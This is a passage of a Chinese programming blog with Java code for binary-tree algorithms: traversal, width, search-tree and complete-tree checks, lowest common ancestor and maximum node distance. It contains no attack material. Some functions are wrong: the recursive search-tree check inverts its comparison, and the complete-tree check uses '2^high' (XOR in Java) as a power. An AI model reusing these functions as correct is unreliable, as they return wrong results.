stack.add(pop.left);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">               stack.add(pop.right);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span> (!stack1.isEmpty()) &#123;</span><br><span class="line">           System.out.print(stack1.pop().value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>宽度遍历</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宽度遍历  也就是将二叉树一行一行的遍历</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WideTraverse</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        <span class="comment">//关键就是我们需要知道我们遍历节点的层数  我们可以使用LinkedList(Java提供的队列 先进先出)</span></span><br><span class="line">        LinkedList&lt;Point&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        list.add(tree);</span><br><span class="line">        <span class="keyword">while</span> (!list.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> list.pop();</span><br><span class="line">            System.out.print(pop.value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (pop.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                list.add(pop.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                list.add(pop.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>求二叉树的宽度</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//求二叉树的宽度  也就是求出整棵树哪一行的节点最多  使用map和栈（不灵活）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">GetWid</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        HashMap&lt;Point, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(tree, <span class="number">1</span>);</span><br><span class="line">        Stack&lt;Point&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.add(tree);</span><br><span class="line">        <span class="type">int</span> <span class="variable">flor</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            <span class="comment">//从栈中pop出的元素的层数</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> map.get(pop);</span><br><span class="line">            System.out.println(pop.value + <span class="string">&quot; 层数：&quot;</span> + num);</span><br><span class="line">            <span class="keyword">if</span> (num &gt; flor) &#123;</span><br><span class="line">                flor = num;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                map.put(pop.right, num + <span class="number">1</span>);</span><br><span class="line">                stack.add(pop.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pop.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                map.put(pop.left, num + <span class="number">1</span>);</span><br><span class="line">                stack.add(pop.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//所有层的元素个数已经统计出  也知道有多少层了</span></span><br><span class="line">        <span class="type">int</span>[] ints = <span class="keyword">new</span> <span class="title class_">int</span>[flor + <span class="number">1</span>];</span><br><span class="line">        Set&lt;Map.Entry&lt;Point, Integer&gt;&gt; entries = map.entrySet();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Point, Integer&gt; entry : entries) &#123;</span><br><span class="line">            ints[entry.getValue()] = ints[entry.getValue()] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">            <span class="keyword">if</span> (anInt &gt; max) &#123;</span><br><span class="line">                max = anInt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;最大节点数：&quot;</span> + max);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//求二叉树的宽度  使用队列和map</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">GetWidByLinkedList</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        LinkedList&lt;Point&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Point, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        list.add(tree);</span><br><span class="line">        map.put(tree, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//当前所在行</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">curLevel</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//所在行节点数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">curNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//整棵树最多节点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!list.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> list.pop();</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">level</span> <span class="operator">=</span> map.get(pop);</span><br><span class="line">            <span class="keyword">if</span> (level == curLevel) &#123;</span><br><span class="line">                curNum++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max = Math.max(max, curNum);</span><br><span class="line">                curNum = <span class="number">1</span>;</span><br><span class="line">                curLevel = level;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pop.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                map.put(pop.left, level + <span class="number">1</span>);</span><br><span class="line">                list.add(pop.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                map.put(pop.right, level + <span class="number">1</span>);</span><br><span class="line">                list.add(pop.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最多节点数：&quot;</span> + Math.max(max, curNum));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>判断是否为搜索二叉树</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断二叉树为搜索二叉树   左子节点的值 &lt;= 当前节点的值 &lt;= 右子节点的值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">isSearchTree</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        <span class="comment">//使用中序遍历</span></span><br><span class="line">        <span class="keyword">if</span> (tree == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tree.left != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tree.left.value &gt;= tree.value) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是搜索二叉树&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            isSearchTree(tree.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tree.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tree.value &lt;= tree.right.value) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是搜索二叉树&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            isSearchTree(tree.right);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;是搜索二叉树&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>判断是否为完整二叉树</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否为完全二叉树  也就是要树是完整拥有左右子节点的 ，要么从左至右 填补叶节点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">isCompleteBinaryTree</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">    <span class="comment">//1.只要有右不左子节点 就是说明不是</span></span><br><span class="line">    <span class="comment">//2.满足1条件后，如果遇到只有左子节点的，则同层节点后面必须没有子节点</span></span><br><span class="line">    <span class="comment">//需要宽度遍历  使用队列</span></span><br><span class="line">    LinkedList&lt;Point&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    list.add(tree);</span><br><span class="line">    <span class="type">Point</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Point</span>();</span><br><span class="line">    <span class="type">Point</span> <span class="variable">finPoint</span> <span class="operator">=</span> test;</span><br><span class="line">    <span class="keyword">while</span> (!list.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> list.pop();</span><br><span class="line">        <span class="keyword">if</span> (pop == finPoint) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!list.isEmpty()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是完全二叉树&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pop.left == <span class="literal">null</span> &amp;&amp; pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不是完全二叉树&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pop.left != <span class="literal">null</span>) &#123;</span><br><span class="line">            list.add(pop.left);</span><br><span class="line">            <span class="keyword">if</span> (test == finPoint &amp;&amp; pop.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                finPoint = pop.left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            list.add(pop.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;是完全二叉树&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>套路判断是否为搜索二叉树</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用二叉树套路解决是否为搜索二叉树</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">isSearchTreeByMethod</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        <span class="comment">//左边为搜索二叉树</span></span><br><span class="line">        <span class="comment">//右边为搜索二叉树</span></span><br><span class="line">        <span class="comment">//左边值&lt;当前值&lt;右边值  所以我们需要知道左右两边的值  使用后序遍历</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSearch</span> <span class="operator">=</span> process(tree).isSearch;</span><br><span class="line">        System.out.println(isSearch?<span class="string">&quot;是搜索二叉树&quot;</span>:<span class="string">&quot;不是搜索二叉树&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReturnType</span>&#123;</span><br><span class="line">        <span class="type">int</span> min;</span><br><span class="line">        <span class="type">int</span> max;</span><br><span class="line">        <span class="type">boolean</span> isSearch;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ReturnType</span><span class="params">(<span class="type">int</span> min,<span class="type">int</span> max,<span class="type">boolean</span> isSearch)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.min = min;</span><br><span class="line">            <span class="built_in">this</span>.max = max;</span><br><span class="line">            <span class="built_in">this</span>.isSearch = isSearch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ReturnType <span class="title function_">process</span><span class="params">(Point head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head==<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ReturnType</span> <span class="variable">LeftData</span> <span class="operator">=</span> process(head.left);</span><br><span class="line">        <span class="type">ReturnType</span> <span class="variable">RightData</span> <span class="operator">=</span> process(head.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> head.value;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> head.value;</span><br><span class="line">        <span class="keyword">if</span> (head.left!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//当前值  与  左节点的最小值  比较</span></span><br><span class="line">            min = Math.min(min,LeftData.min);</span><br><span class="line">            <span class="comment">//当前值  与  左节点的最大值  比较</span></span><br><span class="line">            max = Math.max(max, LeftData.max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (head.right!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//最小值  与  右节点的最小值  比较</span></span><br><span class="line">            min = Math.min(min,RightData.min);</span><br><span class="line">            <span class="comment">//最大值  与  右节点的最大值  比较</span></span><br><span class="line">            max = Math.max(max,RightData.max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSearch</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (LeftData!=<span class="literal">null</span>&amp;&amp;(!LeftData.isSearch||LeftData.max &gt;= head.value)) &#123;</span><br><span class="line">            isSearch = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (RightData!=<span class="literal">null</span>&amp;&amp;(!RightData.isSearch||RightData.min&lt;= head.value)) &#123;</span><br><span class="line">            isSearch = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnType</span>(min,max,isSearch);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>套路判断是否为完全二叉树</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用套路解决是否为完全二叉树</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">isCBT</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        <span class="type">ReturnType</span> <span class="variable">process</span> <span class="operator">=</span> process(tree);</span><br><span class="line">        System.out.println(process.isCBT?<span class="string">&quot;是完全二叉树&quot;</span>:<span class="string">&quot;不是完全二叉树&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReturnType</span> &#123;</span><br><span class="line">        <span class="comment">//节点高度</span></span><br><span class="line">        <span class="type">int</span> high;</span><br><span class="line">        <span class="comment">//节点个数</span></span><br><span class="line">        <span class="type">int</span> Num;</span><br><span class="line">        <span class="comment">//是否为完全二叉树</span></span><br><span class="line">        <span class="type">boolean</span> isCBT;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ReturnType</span><span class="params">(<span class="type">int</span> high, <span class="type">int</span> num, <span class="type">boolean</span> isCBT)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.high = high;</span><br><span class="line">            Num = num;</span><br><span class="line">            <span class="built_in">this</span>.isCBT = isCBT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ReturnType <span class="title function_">process</span><span class="params">(Point head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnType</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ReturnType</span> <span class="variable">leftData</span> <span class="operator">=</span> <span class="literal">null</span> ;</span><br><span class="line">        <span class="type">ReturnType</span> <span class="variable">rightData</span> <span class="operator">=</span> <span class="literal">null</span> ;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCBT</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (head.left != <span class="literal">null</span> &amp;&amp; head.right!=<span class="literal">null</span>) &#123;</span><br><span class="line">            leftData = process(head.left);</span><br><span class="line">            rightData = process(head.right);</span><br><span class="line">            high = leftData.high+<span class="number">1</span>;</span><br><span class="line">            num = leftData.Num+ rightData.Num+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (!leftData.isCBT||!rightData.isCBT) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnType</span>(high,num,<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//层数  与  节点个数呈  N=2^L - 1</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="number">2</span>^high-<span class="number">1</span>)==num) &#123;</span><br><span class="line">                isCBT = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnType</span>(high, num, isCBT);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>套路寻找两个节点的交汇处，也就是给出一个树，给两个点，寻找点的共同交汇处</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//寻找两个节点的交会点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Point <span class="title function_">FindCommon</span> <span class="params">(Point head,Point node1,Point node2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span>||head == node1||head == node2) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Point</span> <span class="variable">left</span> <span class="operator">=</span> FindCommon(head.left, node1, node2);</span><br><span class="line">    <span class="type">Point</span> <span class="variable">right</span> <span class="operator">=</span> FindCommon(head.right, node1, node2);</span><br><span class="line">    <span class="keyword">if</span> (left!=<span class="literal">null</span>&amp;&amp;right!=<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left==<span class="literal">null</span>?right:left;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>二叉树节点间的最大距离（从树上某个点到另一个点最大距离，一个点到相邻一个点的距离为1）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//二叉树节点间最大距离</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ReturnTypeByMaxLen <span class="title function_">maxLength</span><span class="params">(Point hear)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hear == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnTypeByMaxLen</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ReturnTypeByMaxLen</span> <span class="variable">left</span> <span class="operator">=</span> maxLength(hear.left);</span><br><span class="line">        <span class="type">ReturnTypeByMaxLen</span> <span class="variable">right</span> <span class="operator">=</span> maxLength(hear.right);</span><br><span class="line">        <span class="comment">//当前节点不参与  左节点最大距离  与  右节点最大距离比较</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxDistance</span> <span class="operator">=</span> Math.max(left.maxConnect, right.maxConnect);</span><br><span class="line">        <span class="comment">//最大距离值与当前节点参与时  进行比较</span></span><br><span class="line">        maxDistance = Math.max(maxDistance, left.maxDeepLen+<span class="number">1</span>+ right.maxDeepLen);</span><br><span class="line">        <span class="comment">//向上一层  深度+1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnTypeByMaxLen</span>(Math.max(left.maxDeepLen, right.maxDeepLen)+<span class="number">1</span>,maxDistance);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReturnTypeByMaxLen</span> &#123;</span><br><span class="line">        <span class="comment">//最大深度</span></span><br><span class="line">        <span class="type">int</span> maxDeepLen;</span><br><span class="line">        <span class="comment">//节点最大距离</span></span><br><span class="line">        <span class="type">int</span> maxConnect;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ReturnTypeByMaxLen</span><span class="params">(<span class="type">int</span> maxDeepLen, <span class="type">int</span> maxConnect)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.maxDeepLen = maxDeepLen;</span><br><span class="line">            <span class="built_in">this</span>.maxConnect = maxConnect;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>派顿最大快乐值（多叉树）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//派顿最大快乐值（多叉树）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ReturnTypeByMaxHappy <span class="title function_">MaxHappy</span><span class="params">(Employee 